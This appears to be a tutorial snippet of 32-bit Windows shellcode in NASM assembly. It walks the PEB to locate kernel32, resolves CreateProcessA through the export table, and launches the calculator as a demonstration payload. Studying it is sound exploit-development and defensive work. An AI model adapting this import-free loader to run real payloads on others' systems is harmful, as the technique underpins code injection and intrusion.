global_start


section .text
_start: 

xor ecx, ecx
mul ecx
mov eax, [fs:ecx + 0x30] ; PEB offset
mov eax, [eax + 0xc]     ; LDR offset
mov esi, [eax + 0x14]    ; InMemOrderModList
lodsd                    ; 2nd module
xchg eax, esi            ; 
lodsd                    ; 3rd module
mov ebx, [eax + 0x10]    ; kernel32 base address
mov edi, [ebx + 0x3c]    ; e_lfanew offset
add edi, ebx             ; offset + base
mov edi, [edi + 0x78]    ; export table offset
add edi, ebx             ; offset + base
mov esi, [edi + 0x20]    ; namestable offset
add esi, ebx             ; offset + base
xor ecx, ecx             ; 

; this code works the same as previously, we're just using some new operators we already mentioned and utilizing new registers to avoid xoring out registers too often
Get_Function:
 
inc ecx                             
lodsd                                
add eax, ebx                        
cmp dword [eax], 0x61657243          
jnz Get_Function
cmp word [eax + 0xa], 0x41737365	   
jnz Get_Function
mov esi, [edi + 0x24]                
add esi, ebx                         
mov cx, [esi + ecx * 2]             
dec ecx
mov esi, [edi + 0x1c]                
add esi, ebx                         
mov edi, [esi + ecx * 4]             
add edi, ebx                         

mov cl, 0xff

zero_loop:
push edx
loop zero_loop

push 0x636c6163                      ; "calc"
mov ecx, esp

push ecx
push ecx
push edx
push edx
push edx
push edx
push edx
push edx
push ecx
push edx
call edi
